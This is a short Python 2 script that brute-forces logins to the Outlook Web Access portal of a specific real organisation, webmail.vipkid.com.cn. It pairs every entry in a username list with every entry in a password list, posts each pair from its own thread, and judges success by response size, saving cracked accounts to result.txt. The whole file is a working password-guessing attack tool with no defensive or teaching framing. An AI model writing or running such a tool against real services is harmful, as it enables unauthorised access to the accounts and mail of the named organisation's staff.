#! /usr/bin/env python
# coding:utf-8

import sys
import time
import urllib
import urllib2
from threading import Thread

def crack(username, password):
    url = 'http://webmail.vipkid.com.cn/owa/auth.owa'
    values = {'destination':'http://webmail.vipkid.com.cn/owa','flags':4,'forcedownlevel':0,'username':username+'@vipkid.com.cn','password':password,'isUtf8':1}
    data = urllib.urlencode(values)
    print username +' '+ password 
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    the_page = response.read()
    if (len(the_page)/1024 ==41):
        r = open('result.txt','w')
        r.writelines(username +' : '+ password)
        r.close()
        print username + ' has been cracked by password : ' + password

if __name__ == '__main__':
    user_list = open('usernames.txt','r').readlines()
    pwd_list = open('passwords.txt','r').readlines()
    count = len(user_list)
    
    print '用户总数： ' + str(len(user_list))
    print '密码总数： ' + str(len(pwd_list))
    thread_list = []
    for j in range(0,len(pwd_list),1):
        for i in range(0,len(user_list),1):
            t = Thread(target=crack,args=(user_list[i].strip(),pwd_list[j].strip()))
            t.start()
            thread_list.append(t)
            time.sleep(0.1)
    for x in thread_list:
        x.join()
    